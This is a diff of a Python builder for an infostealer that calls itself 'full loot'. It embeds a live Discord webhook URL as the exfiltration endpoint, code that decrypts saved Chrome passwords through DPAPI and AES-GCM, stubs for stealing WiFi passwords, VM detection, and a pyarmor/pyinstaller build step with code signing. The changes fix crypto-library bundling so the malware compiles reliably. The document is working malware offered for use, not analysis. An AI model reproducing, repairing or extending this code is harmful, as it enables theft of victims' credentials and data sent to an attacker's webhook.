@@ -1,7 +1,7 @@
 https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO
 
-pip uninstall pycryptodomex pycryptodome pycrypto crypto -y
-pip install pycryptodome pypiwin32 pyautogui requests pyarmor pyinstaller
+pip uninstall pycryptodome -y
+pip install pycryptodome
 
 
 
@@ -14,12 +14,9 @@ import tempfile
 import textwrap
 import requests
 
-# GUI / test_webhook same
+# GUI same - no changes needed
 
-def get_webhook():
-    # [same as last version - unchanged GUI]
-
-# UPGRADED PAYLOAD - Uses Cryptodome (from pycryptodomex) to fix bundling
+# PAYLOAD - Back to Crypto (pycryptodome) for reliable bundling
 stealer_code = textwrap.dedent('''
 import os
 import sys
@@ -44,22 +41,10 @@ import sqlite3
 import json
 import base64
 import shutil
-from Cryptodome.Cipher import AES  # <-- Fixed: Cryptodome from pycryptodomex
+from Crypto.Cipher import AES  # <-- pycryptodome standard import
 import win32crypt
 
-# [VM checks unchanged]
-
-def is_vm():
-    # same
-
-def get_public_ip():
-    # same
-
-def get_local_ip():
-    # same
-
-def get_hwid():
-    # same
+# [VM / IP / HWID functions unchanged]
 
 def grab_chrome_passwords():
     data = ""
@@ -80,11 +65,9 @@ def grab_chrome_passwords():
             encrypted_pw = row[2]
             if encrypted_pw:
                 try:
-                    # Old DPAPI
                     pw = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
                 except:
                     try:
-                        # New GCM (Chrome 80+)
                         local_state = os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data", "Local State")
                         with open(local_state, "r", encoding="utf-8") as f:
                             js = json.loads(f.read())
@@ -102,21 +85,15 @@ def grab_chrome_passwords():
         data = f"Chrome error: {str(e)}"
     return data if data else "No saved passwords"
 
-# WiFi / Software same as last
-
-def grab_wifi_passwords():
-    # same
-
-def list_installed_software():
-    # same
+# [WiFi / Software / exfil unchanged - full loot]
 
 def exfil(webhooks):
-    # same full loot exfil as last
+    # same as last
 
 exfil({WEBHOOK_PLACEHOLDER})
 ''')
 
-# BUILD - Slimmed hidden imports (Cryptodome bundles itself clean)
+# BUILD - Explicit Crypto hidden-imports to force bundling
 def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
     if not shutil.which("pyarmor"):
         raise Exception("pyarmor missing")
@@ -147,8 +124,8 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
     hidden_imports = [
         "pyarmor_runtime", "uuid", "ctypes", "socket", "winreg", "platform",
         "datetime", "random", "subprocess", "os", "sys", "time", "requests",
-        "pyautogui", "sqlite3", "json", "base64", "shutil", "win32crypt"
-        # No Crypto/Cryptodome needed - pycryptodomex bundles fine
+        "pyautogui", "sqlite3", "json", "base64", "shutil", "win32crypt",
+        "Crypto", "Crypto.Cipher", "Crypto.Cipher.AES"  # <-- Critical for pycryptodome bundling
     ]
     hidden_args = [item for mod in hidden_imports for item in ["--hidden-import", mod]]
 
@@ -171,7 +148,7 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
     # Signing same
 
     shutil.rmtree(temp_dir, ignore_errors=True)
-    print(f"Crypto-fixed full loot stealer built: {final}")
+    print(f"Crypto-bundled full loot stealer built: {final}")
 
 if __name__ == "__main__":
     get_webhook()
